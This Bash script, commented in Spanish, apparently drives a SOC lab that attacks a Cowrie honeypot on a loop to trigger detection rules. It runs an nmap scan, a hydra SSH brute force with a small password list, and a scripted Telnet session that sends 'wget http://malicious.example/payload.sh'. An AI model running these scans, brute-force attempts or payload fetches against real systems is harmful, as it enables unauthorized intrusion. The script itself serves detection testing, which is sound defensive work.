#!/bin/bash
# Valhalla SOC — Simulador de ataques contra Cowrie (cada 15 min, 3 vectores)
set -euo pipefail

COWRIE_HOST="${COWRIE_HOST:-cowrie}"
SSH_PORT="${COWRIE_SSH_PORT:-2222}"
TELNET_PORT="${COWRIE_TELNET_PORT:-2223}"
INTERVAL_SEC="${ATTACK_INTERVAL_SEC:-900}"

log() { echo "[$(date -Iseconds)] [ATTACKER] $*"; }

attack_nmap() {
  log "VECTOR 1 — Reconocimiento (nmap)"
  nmap -sV -T4 -p "${SSH_PORT},${TELNET_PORT}" "$COWRIE_HOST" 2>/dev/null || true
}

# Diccionario propio: primero contraseñas que el honeypot DENIEGA (userdb.txt) para
# generar >= 5 fallos seguidos (regla 100111, T1110) y al final una que ACEPTA
# (userdb: *:x:*), lo que dispara "login tras fuerza bruta" (regla 100113, T1078).
# Antes apuntaba a un diccionario inexistente y solo hacía 1 intento.
WORDLIST=/tmp/valhalla-wordlist.txt
LAB_PASSWORD="${LAB_PASSWORD:-Valhalla-lab-2026}"
printf '%s\n' root admin password 123456 toor "$LAB_PASSWORD" > "$WORDLIST"

attack_ssh_bruteforce() {
  log "VECTOR 2 — Fuerza bruta SSH (hydra, $(wc -l < "$WORDLIST") contraseñas)"
  hydra -l root -P "$WORDLIST" -t 1 -W 1 -f -s "$SSH_PORT" "$COWRIE_HOST" ssh 2>/dev/null || true
}

attack_telnet_interactive() {
  log "VECTOR 3 — Telnet + comandos simulados"
  {
    sleep 1
    echo "root"
    sleep 1
    echo "$LAB_PASSWORD"   # credencial aceptada por el honeypot: así se ejecutan los comandos
    sleep 1
    echo "whoami"
    sleep 1
    echo "uname -a"
    sleep 1
    echo "wget http://malicious.example/payload.sh"
    sleep 1
    echo "exit"
  } | timeout 25 telnet "$COWRIE_HOST" "$TELNET_PORT" 2>/dev/null || true
}

log "Iniciando bucle de ataques → ${COWRIE_HOST}:${SSH_PORT}/${TELNET_PORT} cada ${INTERVAL_SEC}s"
sleep 30

while true; do
  attack_nmap
  sleep 5
  attack_ssh_bruteforce
  sleep 5
  attack_telnet_interactive
  log "Ciclo completado. Esperando ${INTERVAL_SEC}s..."
  sleep "$INTERVAL_SEC"
done
